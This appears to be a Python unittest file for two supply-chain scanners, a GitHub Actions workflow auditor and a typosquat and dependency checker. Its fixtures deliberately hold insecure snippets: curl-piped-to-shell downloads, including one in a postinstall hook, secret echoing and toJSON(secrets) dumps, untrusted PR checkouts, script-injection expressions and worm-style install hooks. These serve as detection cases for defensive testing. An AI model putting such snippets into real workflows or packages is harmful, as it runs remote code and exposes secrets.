import json
import os
import tempfile
import unittest

from _helpers import call_main, load_script, run_cli, skill_path

ci = load_script("supply-chain", "ci_audit")
ts = load_script("supply-chain", "typosquat_check")
EX = skill_path("supply-chain", "examples")
INSECURE_WF = str(EX / "workflows" / "insecure" / "pr-preview.yml")
SECURE_WF = str(EX / "workflows" / "secure" / "ci.yml")
SHA = "a" * 40


def ids(findings):
    return {f["id"] for f in findings}


def wf(text):
    out = []
    for doc in ci.load_yaml_docs(text):
        out += ci.audit_workflow(doc, "w.yml")
    return out


SAFE_WF = f"""name: ci
on: [push, pull_request]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{SHA} # v4
      - run: npm ci --ignore-scripts && npm test
"""


class CiAuditChecks(unittest.TestCase):
    def test_safe_workflow_is_clean(self):
        self.assertEqual(wf(SAFE_WF), [])

    def test_unpinned_actions(self):
        text = SAFE_WF.replace(f"actions/checkout@{SHA} # v4", "some-org/deploy@main")
        f = [x for x in wf(text) if x["id"] == "GHA-001"]
        self.assertEqual(f[0]["severity"], "high")
        self.assertEqual(f[0]["location"], "w.yml:9")
        self.assertEqual(ci.check_uses("some-org/deploy@v2", 1, "p")["severity"], "medium")
        self.assertEqual(ci.check_uses("actions/setup-node@v4", 1, "p")["severity"], "low")
        self.assertEqual(ci.check_uses("docker://alpine:3.20", 1, "p")["severity"], "medium")
        self.assertIsNone(ci.check_uses(f"some-org/deploy@{SHA}", 1, "p"))
        self.assertIsNone(ci.check_uses("./.github/actions/local", 1, "p"))
        self.assertIsNone(ci.check_uses("docker://alpine@sha256:" + "b" * 64, 1, "p"))

    def test_prt_head_checkout_is_critical(self):
        text = f"""on: pull_request_target
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{SHA}
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
      - run: npm install
"""
        f = wf(text)
        self.assertIn("GHA-002", ids(f))
        self.assertNotIn("GHA-003", ids(f))
        self.assertEqual([x for x in f if x["id"] == "GHA-002"][0]["severity"], "critical")

    def test_prt_without_checkout_is_only_low(self):
        text = f"""on: pull_request_target
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@{SHA}
"""
        self.assertEqual(ids(wf(text)), {"GHA-003"})

    def test_script_injection_with_block_line(self):
        text = f"""on: issues
permissions:
  contents: read
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo start
          echo "${{{{ github.event.issue.title }}}}"
"""
        f = [x for x in wf(text) if x["id"] == "GHA-010"]
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["location"], "w.yml:10")

    def test_env_indirection_is_not_injection(self):
        text = f"""on: issues
permissions:
  contents: read
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{{{ github.event.issue.title }}}}
        run: echo "$TITLE"
"""
        self.assertNotIn("GHA-010", ids(wf(text)))

    def test_github_script_injection(self):
        text = f"""on: issue_comment
permissions:
  contents: read
jobs:
  bot:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@{SHA}
        with:
          script: |
            console.log("${{{{ github.event.comment.body }}}}")
"""
        f = [x for x in wf(text) if x["id"] == "GHA-010"]
        self.assertEqual(len(f), 1)
        self.assertIn("process.env", f[0]["fix"])

    def test_permissions(self):
        self.assertIn("GHA-020", ids(wf(SAFE_WF.replace("permissions:\n  contents: read", "permissions: write-all"))))
        self.assertIn("GHA-021", ids(wf(SAFE_WF.replace("permissions:\n  contents: read\n", ""))))
        self.assertNotIn("GHA-021", ids(wf(SAFE_WF)))

    def test_secrets_echo_and_tojson(self):
        bad = SAFE_WF.replace("npm ci --ignore-scripts && npm test", "echo ${{ secrets.NPM_TOKEN }}")
        self.assertIn("GHA-030", ids(wf(bad)))
        dump = SAFE_WF.replace("npm ci --ignore-scripts && npm test", "node x.js '${{ toJSON(secrets) }}'")
        self.assertIn("GHA-030", ids(wf(dump)))
        ok = SAFE_WF.replace("npm ci --ignore-scripts && npm test", "npm publish")
        self.assertNotIn("GHA-030", ids(wf(ok)))

    def test_self_hosted_on_pr(self):
        self.assertIn("GHA-031", ids(wf(SAFE_WF.replace("ubuntu-latest", "[self-hosted, linux]"))))
        push_only = SAFE_WF.replace("[push, pull_request]", "[push]").replace("ubuntu-latest", "self-hosted")
        self.assertNotIn("GHA-031", ids(wf(push_only)))

    def test_curl_pipe_and_unsecure_commands(self):
        self.assertIn("GHA-040", ids(wf(SAFE_WF.replace("npm ci --ignore-scripts && npm test",
                                                         "curl -sSL https://get.example.test/i.sh | bash"))))
        text = SAFE_WF.replace("jobs:", "env:\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: true\njobs:")
        self.assertIn("GHA-041", ids(wf(text)))

    def test_allow_unsafe_pr_checkout(self):
        text = f"""on: pull_request_target
permissions:
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{SHA}
        with:
          allow-unsafe-pr-checkout: true
"""
        f = [x for x in wf(text) if x["id"] == "GHA-004"]
        self.assertEqual([x["severity"] for x in f], ["critical"])
        self.assertNotIn("GHA-004", ids(wf(text.replace("true", "false"))))

    def test_pr_code_fetched_around_checkout_guard(self):
        text = f"""on: issue_comment
permissions:
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: gh pr checkout ${{{{ github.event.issue.number }}}} && make
"""
        self.assertIn("GHA-005", ids(wf(text)))
        self.assertNotIn("GHA-005", ids(wf(text.replace("on: issue_comment", "on: pull_request"))))
        co = text.replace("      - run: gh pr checkout ${{ github.event.issue.number }} && make\n",
                          f"      - uses: actions/checkout@{SHA}\n        with:\n          ref: refs/pull/${{{{ github.event.issue.number }}}}/head\n")
        self.assertIn("GHA-005", ids(wf(co)))

    def test_github_env_write(self):
        text = f"""on: workflow_run
permissions:
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo "NAME=$BRANCH" >> "$GITHUB_ENV"
"""
        self.assertIn("GHA-011", ids(wf(text)))
        self.assertNotIn("GHA-011", ids(wf(text.replace("on: workflow_run", "on: push"))))

    def test_secrets_inherit(self):
        text = """on: push
permissions:
  contents: read
jobs:
  call:
    uses: acme/shared/.github/workflows/deploy.yml@""" + SHA + """
    secrets: inherit
"""
        self.assertIn("GHA-022", ids(wf(text)))
        self.assertNotIn("GHA-022", ids(wf(text.replace("secrets: inherit", "secrets:\n      TOKEN: ${{ secrets.DEPLOY }}"))))

    def test_artifact_poisoning(self):
        text = f"""on: workflow_run
permissions:
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@{SHA}
"""
        self.assertIn("GHA-032", ids(wf(text)))
        self.assertNotIn("GHA-032", ids(wf(text.replace("on: workflow_run", "on: push"))))

    def test_compromised_actions(self):
        text = SAFE_WF.replace(f"actions/checkout@{SHA} # v4", "tj-actions/changed-files@v45")
        self.assertEqual([x["severity"] for x in wf(text) if x["id"] == "GHA-042"], ["high"])
        bad = SAFE_WF.replace(f"actions/checkout@{SHA} # v4", "tj-actions/changed-files@0e58ed8" + "0" * 33)
        self.assertEqual([x["severity"] for x in wf(bad) if x["id"] == "GHA-042"], ["critical"])
        ok = SAFE_WF.replace(f"actions/checkout@{SHA} # v4", f"tj-actions/changed-files@{SHA}")
        self.assertNotIn("GHA-042", ids(wf(ok)))
        self.assertIn("GHA-042", ids(wf(SAFE_WF.replace(f"actions/checkout@{SHA} # v4", "reviewdog/action-shellcheck@v1"))))

    def test_container_credentials(self):
        text = SAFE_WF.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    container:\n      image: ghcr.io/acme/build:1\n"
                               "      credentials:\n        username: bot\n        password: FAKEpassword123\n")
        self.assertIn("GHA-043", ids(wf(text)))
        self.assertNotIn("GHA-043", ids(wf(text.replace("FAKEpassword123", "${{ secrets.REGISTRY_PASSWORD }}"))))

    def test_plain_http_download(self):
        self.assertIn("GHA-044", ids(wf(SAFE_WF.replace("npm ci --ignore-scripts && npm test", "curl -o tool http://dl.example.test/tool"))))
        self.assertNotIn("GHA-044", ids(wf(SAFE_WF.replace("npm ci --ignore-scripts && npm test", "curl -o tool https://dl.example.test/tool"))))

    def test_shai_hulud_traces(self):
        f = []
        for doc in ci.load_yaml_docs(SAFE_WF):
            f += ci.audit_workflow(doc, ".github/workflows/shai-hulud-workflow.yml")
        self.assertIn("GHA-045", ids(f))
        runner = SAFE_WF.replace("on: [push, pull_request]", "on: discussion").replace("ubuntu-latest", "[self-hosted, SHA1HULUD]")
        self.assertIn("GHA-045", ids(wf(runner)))
        self.assertNotIn("GHA-045", ids(wf(SAFE_WF)))

    def test_discussion_counts_as_outside_input(self):
        text = SAFE_WF.replace("on: [push, pull_request]", "on: discussion").replace("ubuntu-latest", "self-hosted")
        self.assertIn("GHA-031", ids(wf(text)))

    def test_non_workflow_yaml_is_ignored(self):
        self.assertEqual(wf("name: not a workflow\nsteps: []\n"), [])


class CiAuditCli(unittest.TestCase):
    def test_insecure_example(self):
        code, out, _ = call_main(ci, [INSECURE_WF, "--json"])
        self.assertEqual(code, 1)
        data = json.loads(out)
        self.assertEqual(set(data), {"scanned", "count", "findings"})
        self.assertEqual(data["count"], len(data["findings"]))
        self.assertTrue({"GHA-001", "GHA-002", "GHA-010", "GHA-020", "GHA-030", "GHA-031"} <= ids(data["findings"]))
        for f in data["findings"]:
            self.assertTrue({"id", "severity", "title", "detail", "fix", "location"} <= set(f))
            self.assertIn(f["severity"], ("critical", "high", "medium", "low", "info"))

    def test_secure_example(self):
        code, out, _ = call_main(ci, [SECURE_WF])
        self.assertEqual(code, 0)
        self.assertIn("No issues found", out)

    def test_fail_on_never_and_stdin(self):
        code, _, _ = call_main(ci, [INSECURE_WF, "--fail-on", "never"])
        self.assertEqual(code, 0)
        bad = SAFE_WF.replace("actions/checkout@" + SHA, "actions/checkout@v4")
        self.assertEqual(call_main(ci, ["-"], stdin=bad)[0], 0)  # low only
        self.assertEqual(call_main(ci, ["-", "--fail-on", "low"], stdin=bad)[0], 1)

    def test_bad_input_exit_2(self):
        self.assertEqual(call_main(ci, ["/nonexistent/path.yml"])[0], 2)
        self.assertEqual(call_main(ci, ["-"], stdin="just: yaml\n")[0], 2)

    def test_help_subprocess(self):
        r = run_cli("supply-chain", "ci_audit", "--help")
        self.assertEqual(r.returncode, 0)
        self.assertIn("--fail-on", r.stdout)


class TyposquatChecks(unittest.TestCase):
    def test_osa_distance(self):
        self.assertEqual(ts.osa_distance("requests", "requests"), 0)
        self.assertEqual(ts.osa_distance("reqests", "requests"), 1)
        self.assertEqual(ts.osa_distance("reqeusts", "requests"), 1)  # transposition
        self.assertEqual(ts.osa_distance("numpyy", "numpy"), 1)
        self.assertEqual(ts.osa_distance("abc", "xyz"), 3)

    def test_popular_and_pep503_same_project(self):
        self.assertIsNone(ts.check_name("requests", "pypi", set()))
        self.assertIsNone(ts.check_name("typing_extensions", "pypi", set()))
        self.assertIsNone(ts.check_name("Django", "pypi", set()))

    def test_one_edit(self):
        f = ts.check_name("reqeusts", "pypi", set())
        self.assertEqual((f["id"], f["severity"]), ("TYPO-001", "high"))
        self.assertIn("requests", f["title"])
        self.assertEqual(ts.check_name("lodahs", "npm", set())["id"], "TYPO-001")

    def test_npm_separator_swap(self):
        f = ts.check_name("cross_env", "npm", set())
        self.assertEqual(f["id"], "TYPO-001")
        self.assertIn("separator", f["title"])
        self.assertIsNone(ts.check_name("cross-env", "npm", set()))

    def test_affixes(self):
        self.assertEqual(ts.check_name("python-flask", "pypi", set())["id"], "TYPO-002")
        self.assertEqual(ts.check_name("axios-js", "npm", set())["id"], "TYPO-002")

    def test_non_ascii(self):
        self.assertEqual(ts.check_name("rеquests", "pypi", set())["id"], "TYPO-003")

    def test_unrelated_and_allow(self):
        self.assertIsNone(ts.check_name("totally-unrelated-thing", "npm", set()))
        self.assertIsNone(ts.check_name("@scope/lodahs", "npm", set()))
        self.assertIsNone(ts.check_name("reqeusts", "pypi", {"reqeusts"}))

    def test_install_hooks(self):
        risky = '{"scripts": {"postinstall": "curl -s https://x.example.test/a | sh"}, "dependencies": {}}'
        f, _ = ts.check_file("package.json", risky, set(), [])
        self.assertEqual([(x["id"], x["severity"]) for x in f], [("TYPO-010", "high")])
        plain = '{"scripts": {"postinstall": "node build.js"}}'
        self.assertEqual(ts.check_file("package.json", plain, set(), [])[0][0]["severity"], "medium")
        ok = '{"scripts": {"build": "vite build"}}'
        self.assertEqual(ts.check_file("package.json", ok, set(), [])[0], [])

    def test_shai_hulud_hook(self):
        worm = '{"scripts": {"preinstall": "node setup_bun.js"}}'
        f, _ = ts.check_file("package.json", worm, set(), [])
        self.assertIn("TYPO-011", ids(f))
        self.assertNotIn("TYPO-011", ids(ts.check_file("package.json", '{"scripts": {"preinstall": "node setup.js"}}', set(), [])[0]))

    def test_known_malicious_versions(self):
        pkg = '{"dependencies": {"chalk": "5.6.1", "debug": "^4.4.2"}}'
        f, _ = ts.check_file("package.json", pkg, set(), [])
        bad = [x for x in f if x["id"] == "TYPO-012"]
        self.assertEqual(len(bad), 1, "only the exact pin, not the range")
        self.assertEqual(bad[0]["severity"], "critical")
        self.assertEqual(ts.check_file("package.json", '{"dependencies": {"chalk": "5.6.2"}}', set(), [])[0], [])
        f, _ = ts.check_file("requirements.txt", "ultralytics==8.3.41\nrequests==2.32.3\n", set(), [])
        self.assertEqual([x["location"] for x in f if x["id"] == "TYPO-012"], ["requirements.txt:1"])
        self.assertEqual(ts.check_file("requirements.txt", "ultralytics==8.3.47\n", set(), [])[0], [])

    def test_lockfile(self):
        lock = json.dumps({"lockfileVersion": 3, "packages": {
            "": {"name": "app"},
            "node_modules/@ctrl/tinycolor": {"version": "4.1.2"},
            "node_modules/lodash": {"version": "4.17.21"}}}, indent=2)
        f, n = ts.check_file("package-lock.json", lock, set(), [])
        self.assertEqual(n, 2)
        self.assertEqual([x["id"] for x in f], ["TYPO-012"])
        clean = lock.replace("4.1.2", "4.1.0")
        self.assertEqual(ts.check_file("package-lock.json", clean, set(), [])[0], [])
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "package-lock.json"), "w") as fh:
                fh.write(lock)
            code, out, _ = call_main(ts, [d, "--json"])
            self.assertEqual(code, 1)
            self.assertIn("TYPO-012", ids(json.loads(out)["findings"]))

    def test_dependency_confusion_npm(self):
        pkg = '{"dependencies": {"acme-ui-kit": "1.0.0", "@acme/auth": "1.0.0"}}'
        f, n = ts.check_file("package.json", pkg, set(), ["acme"])
        self.assertEqual(n, 2)
        conf = [x for x in f if x["id"] == "TYPO-020"]
        self.assertEqual(len(conf), 1)
        self.assertIn("@acme/ui-kit", conf[0]["fix"])
        self.assertEqual(ts.check_file("package.json", pkg, set(), [])[0], [])

    def test_dependency_confusion_pypi_and_extra_index(self):
        req = "--extra-index-url https://pypi.internal.example.test/simple\nacme-billing==1.0\n"
        f, _ = ts.check_file("requirements.txt", req, set(), ["acme"])
        sev = {x["id"]: x["severity"] for x in f}
        self.assertEqual(sev, {"TYPO-021": "medium", "TYPO-020": "high"})
        f2, _ = ts.check_file("requirements.txt", "acme-billing==1.0\n", set(), ["acme"])
        self.assertEqual([(x["id"], x["severity"]) for x in f2], [("TYPO-020", "medium")])

    def test_pyproject(self):
        text = '[project]\nname = "x"\ndependencies = [\n  "requests>=2",\n  "numpyy",\n]\n'
        f, n = ts.check_file("pyproject.toml", text, set(), [])
        self.assertEqual(n, 2)
        self.assertEqual(ids(f), {"TYPO-001"})


class TyposquatCli(unittest.TestCase):
    def test_risky_example(self):
        code, out, _ = call_main(ts, [str(EX / "deps-risky"), "--internal-prefix", "acme", "--json"])
        self.assertEqual(code, 1)
        data = json.loads(out)
        self.assertEqual(set(data), {"files", "dependencies", "count", "findings"})
        self.assertEqual(data["count"], len(data["findings"]))
        self.assertTrue({"TYPO-001", "TYPO-002", "TYPO-010", "TYPO-020", "TYPO-021"} <= ids(data["findings"]))
        for f in data["findings"]:
            self.assertTrue({"id", "severity", "title", "detail", "fix", "location"} <= set(f))

    def test_clean_example(self):
        code, out, _ = call_main(ts, [str(EX / "deps-clean"), "--internal-prefix", "acme"])
        self.assertEqual(code, 0)

    def test_fail_on_never(self):
        self.assertEqual(call_main(ts, [str(EX / "deps-risky"), "--fail-on", "never"])[0], 0)

    def test_bad_input_exit_2(self):
        self.assertEqual(call_main(ts, ["/nonexistent/requirements.txt"])[0], 2)
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(call_main(ts, [d])[0], 2)
            p = os.path.join(d, "package.json")
            with open(p, "w") as fh:
                fh.write("{not json")
            self.assertEqual(call_main(ts, [p])[0], 2)

    def test_help_subprocess(self):
        r = run_cli("supply-chain", "typosquat_check", "--help")
        self.assertEqual(r.returncode, 0)
        self.assertIn("--internal-prefix", r.stdout)


if __name__ == "__main__":
    unittest.main()
